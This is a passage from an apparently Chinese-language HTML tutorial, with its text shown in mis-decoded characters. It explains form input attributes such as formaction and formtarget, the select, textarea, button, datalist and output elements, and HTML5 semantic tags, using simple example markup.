class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><p>ä¸Šé¢è¿™é‡Œçš„<code>lname</code>åŒæ ·ä¼šä½œä¸º<code>form1</code>è¡¨å•çš„ä¸€ä¸ªå‚æ•°æäº¤ç»™æœåŠ¡å™¨ã€‚</p><h4 id="formaction"><a href="#formaction" class="headerlink" title="formaction"></a>formaction</h4><p>formaction å±æ€§è§„å®šå½“æäº¤è¡¨å•æ—¶å¤„ç†è¯¥è¾“å…¥æ§ä»¶çš„æ–‡ä»¶çš„ URLã€‚</p><p>formaction å±æ€§è¦†ç›– <code>&lt;form&gt;</code> å…ƒç´ çš„ <code>action</code> å±æ€§ã€‚</p><p>é€‚ç”¨äº type=â€submitâ€ ä»¥åŠ type=â€imageâ€ã€‚</p><p>æ¯”å¦‚å¯ä»¥ç»™å•ç‹¬ä¸€ä¸ªæŒ‰é’®æŒ‡å®šä¸åŒçš„æäº¤è·¯å¾„ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/example/html5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formaction</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/example/html5/demo_admin.asp<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ä»¥ç®¡ç†å‘˜èº«ä»½æäº¤<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><h4 id="formmethod"><a href="#formmethod" class="headerlink" title="formmethod"></a>formmethod</h4><p>å®šä¹‰ç”¨ä»¥å‘ action URL å‘é€è¡¨å•æ•°æ®ï¼ˆform-dataï¼‰çš„ HTTP æ–¹æ³•ã€‚</p><p>formmethod å±æ€§è¦†ç›– <code>&lt;form&gt;</code> å…ƒç´ çš„ method å±æ€§ã€‚</p><p>é€‚ç”¨äº type=â€submitâ€ ä»¥åŠ type=â€imageâ€ã€‚</p><p>å¯ä»¥æ”¹å˜æäº¤çš„æ–¹å¼ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formmethod</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">formaction</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span>   <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit using POST<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><h4 id="formtarget"><a href="#formtarget" class="headerlink" title="formtarget"></a>formtarget</h4><p>è§„å®šçš„åç§°æˆ–å…³é”®è¯æŒ‡ç¤ºæäº¤è¡¨å•ååœ¨ä½•å¤„æ˜¾ç¤ºæ¥æ”¶åˆ°çš„å“åº”ã€‚</p><p>ä¼šè¦†ç›– <code>&lt;form&gt;</code> å…ƒç´ çš„ target å±æ€§ã€‚å¯ä¸ type=â€submitâ€ å’Œ type=â€imageâ€ ä½¿ç”¨ã€‚</p><p>æ¯”å¦‚æŒ‡å®šæŸä¸ªæŒ‰é’®åœ¨æ–°çš„é¡µé¢æ‰“å¼€ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action_page.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit as normal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formtarget</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span>   <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit to a new window<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><h4 id="formenctype"><a href="#formenctype" class="headerlink" title="formenctype"></a>formenctype</h4><p>å®šå½“æŠŠè¡¨å•æ•°æ®ï¼ˆform-dataï¼‰æäº¤è‡³æœåŠ¡å™¨æ—¶å¦‚ä½•å¯¹å…¶è¿›è¡Œç¼–ç ï¼ˆä»…é’ˆå¯¹ method=â€postâ€ çš„è¡¨å•ï¼‰ã€‚</p><p>è¦†ç›– <code>&lt;form&gt;</code> å…ƒç´ çš„ enctype å±æ€§ã€‚</p><h4 id="formnovalidate"><a href="#formnovalidate" class="headerlink" title="formnovalidate"></a>formnovalidate</h4><p>å¸ƒå°”å±æ€§ã€‚å¦‚æœè®¾ç½®ï¼Œåˆ™è§„å®šåœ¨æäº¤è¡¨å•æ—¶ä¸å¯¹ <code>&lt;input&gt;</code> å…ƒç´ è¿›è¡ŒéªŒè¯ã€‚</p><p>è¦†ç›– <code>&lt;form&gt;</code> å…ƒç´ çš„ novalidate å±æ€§ã€‚å¯ç”¨äº type=â€submitâ€ã€‚</p><hr><p>å™—ï¼Œç»ˆäºçœ‹å®Œ input å…ƒç´ çš„å±æ€§äº†ï¼ŒçœŸçš„å¤šemmm</p><p>ä¸‹é¢æ¥ç€çœ‹å…¶ä»–çš„è¡¨å•å…ƒç´ å§ã€‚</p><h3 id="select-å…ƒç´ -ä¸‹æ‹‰åˆ—è¡¨"><a href="#select-å…ƒç´ -ä¸‹æ‹‰åˆ—è¡¨" class="headerlink" title="select å…ƒç´  ä¸‹æ‹‰åˆ—è¡¨"></a>select å…ƒç´  ä¸‹æ‹‰åˆ—è¡¨</h3><p><code>&lt;select&gt;</code> å®šä¹‰<strong>ä¸‹æ‹‰åˆ—è¡¨</strong>ï¼Œ<code>&lt;option&gt;</code> å…ƒç´ å®šä¹‰<strong>å¾…é€‰æ‹©çš„é€‰é¡¹</strong>ã€‚</p><p>åˆ—è¡¨é€šå¸¸ä¼šæŠŠé¦–ä¸ªé€‰é¡¹æ˜¾ç¤ºä¸ºè¢«é€‰é€‰é¡¹ã€‚</p><p>å¯ä»¥é€šè¿‡æ·»åŠ  <code>selected</code> å±æ€§æ¥å®šä¹‰é¢„å®šä¹‰é€‰é¡¹ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cars<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>volvo<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Volvo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>saab<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Saab<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fiat<span class="token punctuation">"</span></span> <span class="token attr-name">selected</span><span class="token punctuation">&gt;</span></span>Fiat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>audi<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Audi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span></code></pre><select name="cars"><option value="volvo">Volvo</option><option value="saab">Saab</option><option value="fiat" selected="">Fiat</option><option value="audi">Audi</option></select><br><h3 id="textarea-å…ƒç´ -æ–‡æœ¬åŸŸ"><a href="#textarea-å…ƒç´ -æ–‡æœ¬åŸŸ" class="headerlink" title="textarea å…ƒç´  æ–‡æœ¬åŸŸ"></a>textarea å…ƒç´  æ–‡æœ¬åŸŸ</h3><p>å®šä¹‰å¤šè¡Œè¾“å…¥å­—æ®µï¼ˆ<em>æ–‡æœ¬åŸŸ</em>ï¼‰ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>The cat was playing in the garden.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span></code></pre><textarea name="message" rows="10" cols="30">The cat was playing in the garden.</textarea><br><p>ä¸Šé¢è¿™é‡ŒæŒ‡å®šäº†é»˜è®¤æƒ…å†µä¸‹ä¸€è¡Œ30ä¸ªå­—ç¬¦ï¼Œä¸€åˆ—10ä¸ªå­—ç¬¦ã€‚æ³¨æ„ä¸€è¡Œé‡Œä¸€ä¸ªæ±‰å­—ç®—ä½œ2ä¸ªå­—ç¬¦å“’ã€‚</p><h3 id="button-å…ƒç´ -æŒ‰é’®"><a href="#button-å…ƒç´ -æŒ‰é’®" class="headerlink" title="button å…ƒç´  æŒ‰é’®"></a>button å…ƒç´  æŒ‰é’®</h3><p>å®šä¹‰å¯ç‚¹å‡»çš„<em>æŒ‰é’®</em>ã€‚å…·ä½“å†æŒ‡å®šç›¸åº”çš„åŠ¨ä½œã€‚</p><p>è¿™ä¸ªå’Œ <code>&lt;input type="button"&gt;</code> æ•ˆæœç±»ä¼¼ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert(<span class="token punctuation">'</span>Hello World!<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Click Me!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span></code></pre><p><button type="button" onclick="alert('Hello World!')">Click Me!</button><br><br></p><hr><p>ä¸‹é¢æ˜¯ HTML5 æ–°å¢çš„å…ƒç´ </p><p><code>&lt;datalist&gt;</code>  <code>&lt;keygen&gt;</code>  <code>&lt;output&gt;</code></p><table><thead><tr><th>æ ‡ç­¾</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>&lt;datalist&gt;</code></td><td>å®šä¹‰è¾“å…¥æ§ä»¶çš„é¢„å®šä¹‰é€‰é¡¹ã€‚</td></tr><tr><td><code>&lt;keygen&gt;</code></td><td>å®šä¹‰é”®å¯¹ç”Ÿæˆå™¨å­—æ®µï¼ˆç”¨äºè¡¨å•ï¼‰ã€‚</td></tr><tr><td><code>&lt;output&gt;</code></td><td>å®šä¹‰è®¡ç®—ç»“æœã€‚</td></tr></tbody></table><h3 id="datalist-å…ƒç´ -é¢„å®šä¹‰é€‰é¡¹åˆ—è¡¨"><a href="#datalist-å…ƒç´ -é¢„å®šä¹‰é€‰é¡¹åˆ—è¡¨" class="headerlink" title="datalist å…ƒç´  é¢„å®šä¹‰é€‰é¡¹åˆ—è¡¨"></a>datalist å…ƒç´  é¢„å®šä¹‰é€‰é¡¹åˆ—è¡¨</h3><p>è§„å®šé¢„å®šä¹‰é€‰é¡¹åˆ—è¡¨ã€‚</p><p>ç”¨æˆ·ä¼šåœ¨ä»–ä»¬è¾“å…¥æ•°æ®æ—¶çœ‹åˆ°é¢„å®šä¹‰é€‰é¡¹çš„ä¸‹æ‹‰åˆ—è¡¨ã€‚</p><p><code>&lt;input&gt;</code> å…ƒç´ çš„ <em>list</em> å±æ€§å¿…é¡»å¼•ç”¨ <code>&lt;datalist&gt;</code> å…ƒç´ çš„ <em>id</em> å±æ€§ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>datalist</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Internet Explorer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Firefox<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Chrome<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Opera<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Safari<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>datalist</span><span class="token punctuation">&gt;</span></span> </code></pre><input list="browsers"><datalist id="browsers">   <option value="Internet Explorer">   </option><option value="Firefox">   </option><option value="Chrome">   </option><option value="Opera">   </option><option value="Safari"></option></datalist> <p>ä¸Šé¢çš„inputå…ƒç´ çš„å±æ€§é‡Œä¹Ÿæåˆ°äº†ã€‚</p><br><h3 id="output-å…ƒç´ "><a href="#output-å…ƒç´ " class="headerlink" title="output å…ƒç´ "></a>output å…ƒç´ </h3><p>ä½œä¸ºè®¡ç®—ç»“æœè¾“å‡ºæ˜¾ç¤º(æ¯”å¦‚æ‰§è¡Œè„šæœ¬çš„è¾“å‡º)ã€‚</p><table><thead><tr><th>å±æ€§</th><th>å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>for</td><td><em>element_id</em></td><td>æè¿°è®¡ç®—ä¸­ä½¿ç”¨çš„å…ƒç´ ä¸è®¡ç®—ç»“æœä¹‹é—´çš„å…³ç³»ã€‚</td></tr><tr><td>form</td><td><em>form_id</em></td><td>å®šä¹‰è¾“å…¥å­—æ®µæ‰€å±çš„ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨å•ã€‚</td></tr><tr><td>name</td><td><em>name</em></td><td>å®šä¹‰å¯¹è±¡çš„å”¯ä¸€åç§°ï¼ˆè¡¨å•æäº¤æ—¶ä½¿ç”¨ï¼‰ã€‚</td></tr></tbody></table><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">oninput</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x.value=parseInt(a.value)+parseInt(b.value)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>range<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>100+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>b<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>a b<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>output</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form oninput="x.value=parseInt(a.value)+parseInt(b.value)">0<input type="range" id="a" value="50">100+<input type="number" id="b" value="50">=<output name="x" for="a b"></output></form><br><hr><br><h2 id="H5-ä¸­çš„è¯­ä¹‰å…ƒç´ "><a href="#H5-ä¸­çš„è¯­ä¹‰å…ƒç´ " class="headerlink" title="H5 ä¸­çš„è¯­ä¹‰å…ƒç´ "></a>H5 ä¸­çš„è¯­ä¹‰å…ƒç´ </h2><table><thead><tr><th>æ ‡ç­¾</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>&lt;article&gt;</code></td><td>å®šä¹‰æ–‡ç« ã€‚</td></tr><tr><td><code>&lt;aside&gt;</code></td><td>å®šä¹‰é¡µé¢å†…å®¹ä»¥å¤–çš„å†…å®¹ã€‚</td></tr><tr><td><code>&lt;details&gt;</code></td><td>å®šä¹‰ç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹æˆ–éšè—çš„é¢å¤–ç»†èŠ‚ã€‚</td></tr><tr><td><code>&lt;figcaption&gt;</code></td><td>å®šä¹‰ <code>&lt;figure&gt;</code> å…ƒç´ çš„æ ‡é¢˜ã€‚</td></tr><tr><td><code>&lt;figure&gt;</code></td><td>è§„å®šè‡ªåŒ…å«å†…å®¹ï¼Œæ¯”å¦‚å›¾ç¤ºã€å›¾è¡¨ã€ç…§ç‰‡ã€ä»£ç æ¸…å•ç­‰ã€‚</td></tr><tr><td><code>&lt;footer&gt;</code></td><td>å®šä¹‰æ–‡æ¡£æˆ–èŠ‚çš„é¡µè„šã€‚</td></tr><tr><td><code>&lt;header&gt;</code></td><td>è§„å®šæ–‡æ¡£æˆ–èŠ‚çš„é¡µçœ‰ã€‚</td></tr><tr><td><code>&lt;main&gt;</code></td><td>è§„å®šæ–‡æ¡£çš„ä¸»å†…å®¹ã€‚</td></tr><tr><td><code>&lt;mark&gt;</code></td><td>å®šä¹‰é‡è¦çš„æˆ–å¼ºè°ƒçš„æ–‡æœ¬ã€‚</td></tr><tr><td><code>&lt;nav&gt;</code></td><td>å®šä¹‰å¯¼èˆªé“¾æ¥ã€‚</td></tr><tr><td><code>&lt;section&gt;</code></td><td>å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚ã€‚</td></tr><tr><td><code>&lt;summary&gt;</code></td><td>å®šä¹‰ <code>&lt;details&gt;</code> å…ƒç´ çš„å¯è§æ ‡é¢˜ã€‚</td></tr><tr><td><code>&lt;time&gt;</code></td><td>å®šä¹‰æ—¥æœŸ/æ—¶é—´ã€‚</td></tr></tbody></table><h2 id="å¤šåª’ä½“"><a href="#å¤šåª’ä½“" class="headerlink" title="å¤šåª’ä½“"></a>å¤šåª’ä½“</h2><p>Web ä¸Šçš„å¤šåª’ä½“æŒ‡çš„æ˜¯éŸ³æ•ˆã€éŸ³ä¹ã€è§†é¢‘å’ŒåŠ¨ç”»ç­‰ã€‚</p><h3 id="object-å…ƒç´ "><a href="#object-å…ƒç´ " class="headerlink" title="object å…ƒç´ "></a>object å…ƒç´ </h3><p><code>&lt;object&gt;</code> çš„ä½œç”¨æ˜¯æ”¯æŒ HTML åŠ©æ‰‹ï¼ˆæ’ä»¶ï¼‰ã€‚</p><p>è¾…åŠ©åº”ç”¨ç¨‹åºï¼ˆhelper 